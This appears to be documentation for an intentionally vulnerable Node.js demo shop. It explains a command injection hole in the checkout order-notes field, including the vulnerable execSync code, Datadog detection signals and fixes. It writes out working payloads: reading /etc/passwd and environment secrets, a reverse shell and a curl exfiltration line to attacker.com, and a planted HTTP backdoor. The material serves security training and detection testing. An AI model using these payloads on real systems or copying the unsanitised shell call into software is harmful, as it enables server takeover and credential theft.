# Command Injection Vulnerability - Checkout Order Notes

## Overview

The checkout page contains a **critical command injection vulnerability** in the Order Notes field. This vulnerability allows attackers to execute arbitrary system commands on the server.

**Location**: `src/routes/orders.js` (lines 171-204)

## Vulnerability Details

### The Vulnerable Code

```javascript
// VULNERABILITY: Command Injection in Order Notes Processing
if (notes && notes.trim() !== '') {
  const { execSync } = require('child_process');

  // CRITICAL: Directly executing user input in shell command
  const command = `echo "${notes}" | wc -c`;
  const output = execSync(command, { encoding: 'utf8', timeout: 5000 });
  notesValidation = output.trim();
}
```

### Why It's Vulnerable

1. **Direct User Input in Shell Command**: The `notes` field is directly inserted into a shell command without any sanitization
2. **execSync Execution**: Uses Node.js `child_process.execSync()` to execute the command
3. **No Input Validation**: No checks or escaping of special shell characters
4. **String Interpolation**: Uses template literals that don't escape shell metacharacters

### Attack Vectors

Attackers can inject commands using shell metacharacters:
- `;` - Command separator
- `&&` - AND operator
- `||` - OR operator
- `|` - Pipe operator
- `` `command` `` - Command substitution
- `$()` - Command substitution
- `>` - Output redirection

## Exploitation Examples

### 1. Basic Command Execution

**Order Notes Input:**
```bash
"; whoami; echo "
```

**Executed Command:**
```bash
echo ""; whoami; echo "" | wc -c
```

**Result**: Reveals the user running the Node.js process

### 2. Read System Files

**Order Notes Input:**
```bash
"; cat /etc/passwd; echo "
```

**Executed Command:**
```bash
echo ""; cat /etc/passwd; echo "" | wc -c
```

**Result**: Dumps the password file

### 3. List Directory Contents

**Order Notes Input:**
```bash
"; ls -la /app; echo "
```

**Result**: Lists application directory contents

### 4. Environment Variable Extraction

**Order Notes Input:**
```bash
"; env; echo "
```

**Result**: Reveals all environment variables including:
- `DD_API_KEY` - Datadog API key
- `DB_PASSWORD` - Database password
- `SESSION_SECRET` - Session secret

### 5. Network Reconnaissance

**Order Notes Input:**
```bash
"; netstat -tulpn; echo "
```

**Result**: Shows network connections and listening ports

### 6. Reverse Shell (Advanced)

**Order Notes Input:**
```bash
"; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'; echo "
```

**Result**: Opens reverse shell to attacker's machine

### 7. Create Backdoor

**Order Notes Input:**
```bash
"; echo 'const http = require(\"http\"); http.createServer((req, res) => { const { exec } = require(\"child_process\"); exec(req.url.slice(1), (e, stdout) => res.end(stdout)); }).listen(9999);' > /tmp/backdoor.js; node /tmp/backdoor.js &; echo "
```

**Result**: Creates a persistent backdoor on port 9999

## Testing the Vulnerability

### Step 1: Login to the Application

```bash
curl -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -c cookies.txt \
  -d "username=testuser&password=password123"
```

### Step 2: Add Items to Cart

```bash
# Add a pizza to cart (using cookies from Step 1)
curl -X POST http://localhost:3000/orders/cart/add \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"productId": 1, "quantity": 1}'
```

### Step 3: Exploit Command Injection at Checkout

```bash
# Example 1: Execute whoami (using cookies from Step 1)
curl -X POST http://localhost:3000/orders/place \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "deliveryAddress": "123 Test St",
    "deliveryPhone": "555-1234",
    "paymentMethod": "credit_card",
    "notes": "\"; whoami; echo \""
  }'

# Example 2: Read environment variables (using cookies from Step 1)
curl -X POST http://localhost:3000/orders/place \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "deliveryAddress": "123 Test St",
    "deliveryPhone": "555-1234",
    "paymentMethod": "credit_card",
    "notes": "\"; env | grep DD_; echo \""
  }'

# Example 3: Exfiltrate data (using cookies from Step 1)
curl -X POST http://localhost:3000/orders/place \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "deliveryAddress": "123 Test St",
    "deliveryPhone": "555-1234",
    "paymentMethod": "credit_card",
    "notes": "\"; cat /etc/passwd | curl -X POST -d @- https://attacker.com/exfil; echo \""
  }'
```

### Step 4: Check Server Logs

The command output and errors will appear in the server console logs:
```bash
docker-compose logs app
```

## Impact Assessment

### Severity: **CRITICAL** (CVSS 10.0)

### Potential Impact:

1. **Complete System Compromise**
   - Execute any command with application privileges
   - Install backdoors and rootkits
   - Modify or delete system files

2. **Data Breach**
   - Access database credentials
   - Read application source code
   - Steal API keys and secrets
   - Exfiltrate sensitive data

3. **Lateral Movement**
   - Scan internal network
   - Attack other containers/services
   - Pivot to cloud infrastructure

4. **Denial of Service**
   - Kill application process
   - Fill disk space
   - Consume all CPU/memory

5. **Persistence**
   - Create backdoor users
   - Install cron jobs
   - Modify startup scripts

## Detection in Datadog ASM

Datadog Application Security Management will detect this vulnerability:

### ASM Signals

Look for security signals with these characteristics:

- **Attack Type**: Command Injection
- **Rule**: `shell-injection`
- **Affected Endpoint**: `POST /orders/place`
- **Parameter**: `notes`
- **User**: Authenticated user who placed the order

### APM Traces

Traces will include these tags:
- `vulnerability.type: command_injection`
- `vulnerability.category: injection`
- `attack.vector: os_command`
- `input.field: order_notes`
- `command.executed: <actual command>`
- `command.output: <command output>`

### IAST Detection

Interactive Application Security Testing (IAST) will identify:
- **Vulnerability**: Command Injection
- **Severity**: Critical
- **Location**: `src/routes/orders.js:188`
- **Evidence**: User input flows directly to `execSync()`

## Why This Vulnerability Was Added

This intentional vulnerability demonstrates:

1. **Input Validation Importance**: Never trust user input
2. **Dangerous Functions**: Avoid shell command execution with user input
3. **Defense in Depth**: Security controls at multiple layers
4. **ASM Detection**: How Datadog detects command injection attacks
5. **IAST Value**: Runtime vulnerability detection in development

## Available to All Users

✅ **This vulnerability is accessible to any authenticated user**, not just admins:
- Any user can register an account
- Any logged-in user can access checkout
- Any user can place orders with malicious notes
- No special privileges required

This makes it a **high-value target** for attackers and an excellent test case for security monitoring.

## Remediation (For Reference Only)

⚠️ **DO NOT FIX** - This is intentionally vulnerable for testing

If this were a real application, the fix would be:

### Option 1: Remove Shell Execution (Best)
```javascript
// Simply validate without shell commands
if (notes && notes.length > 500) {
  return res.status(400).json({ error: 'Notes too long' });
}
```

### Option 2: Use Safe APIs
```javascript
// Use JavaScript string methods instead of shell
const noteLength = notes.length;
```

### Option 3: Properly Escape (Not Recommended)
```javascript
const { spawn } = require('child_process');
// Use spawn with arguments array (no shell)
const proc = spawn('wc', ['-c']);
proc.stdin.write(notes);
proc.stdin.end();
```

## Testing Checklist

- [ ] Verify basic command injection (whoami)
- [ ] Test environment variable extraction
- [ ] Confirm file system access
- [ ] Check Datadog ASM detection
- [ ] Verify IAST vulnerability report
- [ ] Test with different user accounts
- [ ] Validate trace tags in APM

## Related Vulnerabilities

This application contains multiple injection vulnerabilities:

1. **SQL Injection** - Login, registration, menu, orders
2. **Command Injection** - Admin dashboard (system commands)
3. **Command Injection** - Checkout order notes (this vulnerability)
4. **Path Traversal** - File operations
5. **LDAP Injection** - User lookups

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [Datadog ASM Documentation](https://docs.datadoghq.com/security/application_security/)
- [Node.js child_process Security](https://nodejs.org/en/docs/guides/security/)

---

**⚠️ Remember**: This is an intentionally vulnerable application for security testing and training purposes. Never deploy this to production!
